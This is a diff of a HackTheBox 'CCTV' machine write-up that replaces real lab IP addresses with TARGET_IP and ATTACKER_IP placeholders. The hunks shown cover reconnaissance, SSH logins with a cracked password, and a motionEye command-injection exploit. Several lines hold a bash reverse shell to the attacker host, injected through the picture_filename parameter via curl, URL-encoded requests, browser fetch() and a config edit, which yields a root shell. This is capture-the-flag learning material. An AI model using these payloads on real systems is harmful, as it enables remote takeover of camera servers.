@@ -1,6 +1,6 @@
 # CCTV - HackTheBox Writeup
 
-**Target:** `10.129.244.156`
+**Target:** `TARGET_IP`
 **Domain:** `cctv.htb`
 **OS:** Linux (Ubuntu — CCTV/Camera Platform)
 **Difficulty:** Medium
@@ -50,12 +50,12 @@ Reverse Shell as root → Root Flag
 
 ### Host Setup
 ```bash
-echo "10.129.244.156 cctv.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP cctv.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-nmap -sC -sV -p- 10.129.244.156
+nmap -sC -sV -p- TARGET_IP
 ```
 
 **Key Findings:**
@@ -149,7 +149,7 @@ john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ### Step 4 — SSH Access
 
 ```bash
-ssh mark@10.129.244.156
+ssh mark@TARGET_IP
 # Password: opensesame
 ```
 
@@ -245,7 +245,7 @@ A cron job or scheduled task transmits credentials over the network. We can capt
 ### SSH as sa_mark
 
 ```bash
-ssh sa_mark@10.129.244.156
+ssh sa_mark@TARGET_IP
 # Password: <captured_password>
 ```
 
@@ -282,7 +282,7 @@ The vulnerability operates through a **three-stage failure**:
 motionEye listens on `127.0.0.1:7999` — not accessible externally. Create an SSH tunnel:
 
 ```bash
-ssh -L 8765:127.0.0.1:7999 sa_mark@10.129.244.156
+ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
 ```
 
 **Result:** motionEye web interface accessible at `http://127.0.0.1:8765`.
@@ -315,17 +315,17 @@ nc -lvnp 4444
 
 **2. Craft and send the payload (URL-encoded):**
 ```bash
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/10.10.14.91/4444 0>&1')"
+curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
 ```
 
 **Payload Breakdown:**
 - `$(...)` — Command substitution — the shell executes the enclosed command
-- `bash -c 'bash -i >& /dev/tcp/10.10.14.91/4444 0>&1'` — Standard bash reverse shell
+- `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` — Standard bash reverse shell
 - The payload gets written to `camera-0.conf` as the `picture_filename` value
 
 **Alternative — URL-encoded version:**
 ```bash
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.91%2F4444%200%3E%261%27%29"
+curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
 ```
 
 ### Step 5 — Trigger Motion Detection
@@ -340,7 +340,7 @@ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 ### Step 6 — Reverse Shell Received
 
 ```bash
-connect to [10.10.14.91] from (UNKNOWN) [10.129.244.156] 4444
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 root@cctv:~#
@@ -372,7 +372,7 @@ Instead of using curl, inject the payload directly through the browser console:
 // Open browser console on motionEye UI (http://127.0.0.1:8765)
 // Navigate to Camera Settings → Still Images → Picture Filename
 // Inject payload:
-fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/10.10.14.91/4444 0>&1\')')
+fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\')')
 ```
 
 ### Method 2 — Config File Direct Edit
@@ -380,7 +380,7 @@ fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/10.10.14.9
 If filesystem access is available:
 ```bash
 # Edit motionEye camera config directly
-echo "picture_filename $(bash -c 'bash -i >& /dev/tcp/10.10.14.91/4444 0>&1')" >> /etc/motioneye/camera-0.conf
+echo "picture_filename $(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')" >> /etc/motioneye/camera-0.conf
 
 # Restart motion to trigger execution
 systemctl restart motion
